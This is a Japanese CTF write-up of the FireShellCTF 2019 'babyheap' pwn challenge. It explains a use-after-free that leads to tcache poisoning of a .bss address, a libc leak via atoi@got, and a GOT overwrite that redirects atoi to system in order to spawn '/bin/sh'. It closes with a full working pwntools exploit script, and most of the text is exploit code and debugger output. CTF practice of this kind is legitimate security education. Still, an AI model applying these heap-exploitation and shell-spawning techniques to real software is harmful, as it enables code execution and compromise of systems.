---
title: "babyheap - FireShellCTF 2019"
date: 2022-05-15T18:07:23+09:00
draft: false
---

# 方針
Use After Freeで`fd`を書き換えることで、`.bss+0x20`(グローバル変数のアドレス)をtcacheに繋ぐ。
そのときにすべてのグローバル変数を初期化する。
また、`atoi@got`を`system`に向けて、`system("/bin/sh")`を呼び出す。

## Use After Free
freeした領域の`fd`を`.bss+0x20`で書き換える。

（最初にfreeした領域を`0`と表記する）
```none
tcache: 0 -> (.bss+0x20) -> NULL
```

```python
create()
delete()
edit(p64(e.bss()+0x20)) # 0x6020a0
```

## なぜ`.bss+0x20`のアドレスを繋ぐのか
各種フラグや、mallocして返ってくる領域が`.bss`に置かれています。
したがって、各種フラグの再初期化や、
返ってくる領域に任意のアドレスを書き込みやすいからです。

### .bss sectionのアドレス
```none
gef➤  xfiles
Start              End                Name                  File
0x00000000003ff270 0x00000000003ff450 .dynamic              /ctf/yu1hpa/019/FireShell/babyheap/babyheap
:                    :                    :
0x0000000000602080 0x00000000006020d0 .bss                  /ctf/yu1hpa/2019/FireShell/babyheap/babyheap
```

よって、bssセクションは`0x602080`から始まる。

### 各種フラグの初期化とlibc leakの旅
`create` -> `edit` -> `show` -> `delete`をした時です。
最後に`delete`をしていることと、隠しコマンド`fill`は使ってないので、フラグが立っていません。

（デコンパイラを使って、各アドレスがどのフラグかを確認できます。）
```none
0x6020a0:       0x0000000000000000      0x0000000000000001
0x6020b0:       0x0000000000000001      0x0000000000000001
0x6020c0:       0x0000000000000000      0x0000000000603260
```
```none
0x6020a0: create
0x6020a8: edit
0x6020b0: show
0x6020b8: delete
0x6020c0: fill
0x6020c8: mallocしたときに返ってくる領域
```

あとは`fill`で`.bss+0x20`に書き込み、`show`することで、
libc leakすることができます。

```python
pld = b""
pld += p64(0) # create
pld += p64(0) # edit
pld += p64(0) # show
pld += p64(0) # delete
pld += p64(0) # fill
pld += p64(e.got["atoi"])
fill(pld)
show()
io.recvuntil("Content: ")
libc.address = u64(io.recvline()[:-1].ljust(8, b"\x00")) - libc.sym["atoi"]
```

## GOT Overwrite
`atoi()`が呼び出されたときに、`system()`が呼び出されるようにします。
```none
*atoi@got = system
```

`atoi()`はコマンドの選択で使われているので、
そこで`/bin/sh`という文字列を渡すことで`system("/bin/sh")`が呼び出されます。

# [Solver](https://github.com/yu1hpa/ctf-writeup/blob/master/2019/FireShellCTF/babyheap/solve.py)

```python
from pwn import *

file = "./babyheap"
e = ELF(file)
libc = ELF("./libc.so.6")
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)

def create():
    io.sendlineafter("> ", "1")

def edit(content: bytes):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Content? ", content)

def show():
    io.sendlineafter("> ", "3")

def delete():
    io.sendlineafter("> ", "4")

def fill(content: bytes):
    io.sendlineafter("> ", "1337")
    io.sendlineafter("Fill ", content)

create()
delete()
edit(p64(e.bss()+0x20)) # 0x6020a0
create()

pld = b""
pld += p64(0) # create
pld += p64(0) # edit
pld += p64(0) # show
pld += p64(0) # delete
pld += p64(0) # fill
pld += p64(e.got["atoi"])
fill(pld)
show()
io.recvuntil("Content: ")
libc.address = u64(io.recvline()[:-1].ljust(8, b"\x00")) - libc.sym["atoi"]
print(f'libc base: 0x{libc.address:x}')

edit(p64(libc.sym["system"]))
io.sendlineafter("> ", "/bin/sh\x00")

io.interactive()
```
